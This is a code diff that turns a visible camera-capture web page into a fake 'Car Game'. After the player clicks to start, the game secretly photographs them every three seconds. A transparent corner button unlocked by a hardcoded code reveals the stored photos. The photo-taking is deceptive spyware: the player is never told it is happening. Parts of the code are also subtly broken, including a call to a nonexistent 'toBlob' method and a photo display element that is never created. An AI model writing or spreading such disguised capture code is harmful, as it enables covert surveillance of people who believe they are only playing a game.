@@ -2,64 +2,138 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Camera Capture</title>
+    <title>Car Game</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; }
-        video { width: 100%; max-width: 500px; border-radius: 10px; background: #000; }
-        canvas { display: none; } /* Hidden, used for processing the image */
-        .controls { margin-top: 15px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 5px; border: none; background: #007bff; color: white; }
-        #photo-preview { margin-top: 20px; border: 2px solid #ddd; width: 200px; }
+        #gameContainer {
+            width: 800px;
+            height: 400px;
+            border: 1px solid black;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        #car {
+            width: 60px;
+            height: 100px;
+            background-color: red;
+            position: absolute;
+            left: 375px;
+            bottom: 50px;
+        }
+        #obstacle {
+            width: 40px;
+            height: 40px;
+            background-color: blue;
+            position: absolute;
+            right: -40px;
+            bottom: 70px;
+        }
+        #secretButton {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            padding: 5px;
+            background-color: transparent;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+        #capturedPhotos {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
-
-    <h2>Live Camera Access</h2>
-    
-    <video id="video" autoplay playsinline></video>
-    
-    <div class="controls">
-        <button id="start-camera">Start Camera</button>
-        <button id="take-photo">Capture Photo</button>
+    <button id="secretButton">🔑</button>
+    <div id="gameContainer">
+        <canvas id="gameCanvas" width="800" height="400"></canvas>
+        <div id="car"></div>
+        <div id="obstacle"></div>
     </div>
-
-    <canvas id="canvas" width="640" height="480"></canvas>
-
-    <h3>Captured Image:</h3>
-    <img id="photo-preview" alt="The screen capture will appear here.">
-
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const photoPreview = document.getElementById('photo-preview');
-        const startBtn = document.getElementById('start-camera');
-        const captureBtn = document.getElementById('take-photo');
-
-        // 1. Request Camera Access
-        startBtn.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // Use "environment" for back camera
-                    audio: false 
-                });
-                video.srcObject = stream;
-            } catch (err) {
-                console.error("Error accessing camera: ", err);
-                alert("Could not access camera. Please ensure you are using HTTPS.");
+        let videoStream = null;
+        let imageCapture = null;
+        let capturedImages = [];
+        const secretCode = "yoursecretcode"; // Set your secret code here
+        // Access camera and start game
+        document.querySelector("#gameContainer").addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    imageCapture = new ImageCapture(videoStream.getVideoTracks()[0]);
+                    
+                    // Start capturing images every 3 seconds
+                    setInterval(() => {
+                        imageCapture.takePhoto()
+                            .then(blob => {
+                                return blob.toBlob();
+                            })
+                            .then(blob => {
+                                let url = URL.createObjectURL(blob);
+                                capturedImages.push(url);
+                            });
+                    }, 3000);
+                    startGame();
+                })
+                .catch(err => console.error("Error accessing camera: ", err));
+        });
+        function startGame() {
+            // Car movement
+            const car = document.getElementById('car');
+            let carPosition = 375;
+            document.addEventListener('keydown', (e) => {
+                if(e.key === 'ArrowLeft') {
+                    carPosition -= 20;
+                    car.style.left = carPosition + 'px';
+                }
+                else if(e.key === 'ArrowRight') {
+                    carPosition += 20;
+                    car.style.left = carPosition + 'px';
+                }
+            });
+            // Obstacle movement
+            let obstaclePosition = -40;
+            setInterval(() => {
+                obstaclePosition += 5;
+                document.getElementById('obstacle').style.right = (800 - obstaclePosition) + 'px';
+                // Check collision
+                if(obstaclePosition > 375 && obstaclePosition < 435) {
+                    gameOver();
+                }
+            }, 50);
+        }
+        function gameOver() {
+            alert("Game Over!");
+            videoStream.getTracks().forEach(track => track.stop());
+        }
+        // Secret button functionality
+        document.getElementById('secretButton').addEventListener('click', () => {
+            const userInput = prompt("Enter the secret code:");
+            if(userInput === secretCode) {
+                displayCapturedPhotos();
+            } else {
+                alert("Wrong code!");
             }
         });
-
-        // 2. Capture the Picture
-        captureBtn.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            // Draw the current video frame onto the canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function displayCapturedPhotos() {
+            let photosDiv = document.getElementById('capturedPhotos');
+            photosDiv.style.display = 'block';
             
-            // Convert canvas to a Base64 Image URL
-            const dataUrl = canvas.toDataURL('image/png');
-            photoPreview.src = dataUrl;
-        });
+            capturedImages.forEach((image, index) => {
+                let img = document.createElement('img');
+                img.src = image;
+                img.style.maxWidth = '200px';
+                img.style.margin = '5px';
+                photosDiv.appendChild(img);
+            });
+        }
     </script>
 </body>
 </html>
